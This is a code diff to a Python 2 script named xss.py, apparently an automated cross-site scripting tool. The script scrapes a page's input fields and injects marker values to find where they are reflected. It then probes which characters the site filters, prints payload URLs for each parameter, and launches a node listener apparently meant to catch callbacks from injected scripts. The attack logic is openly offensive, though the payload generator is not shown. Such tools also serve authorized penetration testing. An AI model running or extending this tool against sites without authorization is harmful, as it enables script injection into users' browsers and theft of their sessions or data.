@@ -4,12 +4,15 @@ import requests
 import re
 from functools import reduce
 from random import choice
+from subprocess import Popen
+
+from core import context, genPayload, config, utils
 
 from core.context import getContext
-from core.payload import genPayload
-from core.config import headers
-
-test = "6ix8uzz"
+from core.genPayload import genPayload
+from core.config import headers, TEST_INJCT
+from core.testFilter import testFilter
+from core.utils import get_key_from_val
 
 if len(sys.argv) < 2:
     print("usage: python xss.py url")
@@ -22,43 +25,34 @@ if "http://" not in url:
 input_reg = '<input.*?name=[\'\"](.*?)[\'\"].*?>'
 
 response = requests.get(url, headers=headers)
-
-# find input elements in the response and get their respective 'name' attributes
-# the assumption here is that the GET parameters submitted to the server will have
-# the same as the input names
-data = {}
 params = re.findall(input_reg, response.text)
-paramid = 0
-for param in params:
-    data[param] = test + str(paramid)
-    paramid += 1
 
+# make request with test values to determine where the test inputs are reflected
+data = {params[i-1] : TEST_INJCT + str(i) for i in range(1, len(params) + 1)}
 test_response = requests.get(url, headers=headers, params=data)
-print test_response
+
 reflection_contexts = getContext(test_response)
 
+# test the WAF/Filter with a list of commonly filtered chars: <,>,",', etc..
+filtered = testFilter(url, reflection_contexts, data)
+
 payloads = {}
-for i in range(len(reflection_contexts)):
-    print "Generating payload for {}".format(i)
-    payloads[test + str(i)] = genPayload(reflection_contexts[i])
+url = url if url[-1:] == '/' else url + '/' + '?'
 
-# look for test string in the response
+for i, ctx in enumerate(reflection_contexts):
+    test_input = TEST_INJCT + ctx.paramNum 
+    param = get_key_from_val(test_input, data)
+    if param:
+        payloads[param] = url + param + "=" + genPayload(ctx, filtered)
 
-# final_payloads = {}
-# for line in test_response.text.split('\n'):
-#     injection_site = filter(lambda x : x[0], [(re.match(ctx["match_str"], line), ctx["name"]) for ctx in contexts])
-#     # assume that injection contexts are mutually exlcusive; that is above filter expression should only return one result
-#     injection_site = next(injection_site, None)
-#     if injection_site:
-#         context, name = injection_site
-#         if name == "quotes":
-#             double_quote, single_quote = context.group(1,2)
-#             index = single_quote[-1:] if single_quote else double_quote[-1:]
-#             param_name = params[int(index)]
-#             final_payloads[param_name] = single_quote_payload if single_quote else double_quote_payload
+print "Payloads ..."
+for v in payloads.values():
+    print v
 
-# # lets just use the first param
-# param, payload = list(final_payloads.items())[0]
-# url = url if url[-1:] == '/' else url + '/'
-# url = url + "?" + param + "=" + payload
-# print(url)
+print "Starting listening server ..."
+try:
+    Popen(["node","server.js"], stdin=sys.stdin, stdout=sys.stdout)
+    while True:
+        continue
+except KeyboardInterrupt:
+    print "Shutting down listener..."
